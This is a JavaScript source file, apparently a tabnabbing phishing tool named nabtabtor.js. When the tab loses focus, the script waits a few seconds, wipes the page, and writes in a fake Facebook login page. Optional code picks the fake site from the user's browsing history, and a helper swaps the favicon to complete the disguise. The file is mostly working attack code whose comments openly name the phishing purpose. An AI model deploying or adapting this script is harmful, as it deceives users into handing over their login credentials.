/*
* nabtabtor.js
* 
* George Skouroupathis
*
*/

var min_timeout = 2000,
	max_timeout = 3000;
var siteOn = true;
var visitedSites;

// Optional Sitefinder
window.onload = get_site_history;
// Binds the phishing attack to the blurring event
window.onblur = start_phishing_timeout;
// Binds the failsafe mechanism to the focusing event
window.onfocus = set_site_on;

function set_site_on() {
	siteOn = true;
}

// (Optional) Gets site history
function get_site_history() {
	var sitefinder = new SiteFinder();
	visitedSites = sitefinder.visitedSites;
	// ^  You can access all visited sites through this variable
}

// Counts down to zero from (between max_timeout & min_timeout)
// and calls the phishing process
function start_phishing_timeout() {
	siteOn = false;
	var timeout = Math.round(Math.random() * (max_timeout - min_timeout)) + min_timeout;
	console.log(timeout);
	setTimeout(start_phishing, timeout);
}

// Starts the phishing process
function start_phishing() {
	if (siteOn) return;
	clear_page_contents();
	/*---- Optional Sitefinder ----
	var fakeSite = visitedSites[Math.floor(Math.random() * visitedSites.length)];
	build_page(fakeSite.toLowerCase() + "_fake_page");
	---- */
	build_page(facebook_fake_page);
}
	
// Deletes all the current page elements
function clear_page_contents() {
	var all = document.getElementsByTagName("*");

	for (var i=0, len=all.length; i < len; i++) {
		try {
			 all[i].parentNode.removeChild(all[i]);
		} catch(e) {
			// pass
		}
	}
}

// Displays the page from the webpage object
function build_page(webpage) {
	document.write(webpage.getSource);
	document.close();
}

// Dynamically changes the favicon of the webpage
function change_fav_icon(url) {
	document.head = document.head || document.getElementsByTagName('head')[0];
	var link = document.createElement('link');
	link.rel = 'shortcut icon';
	link.href = url;
	document.head.appendChild(link);
}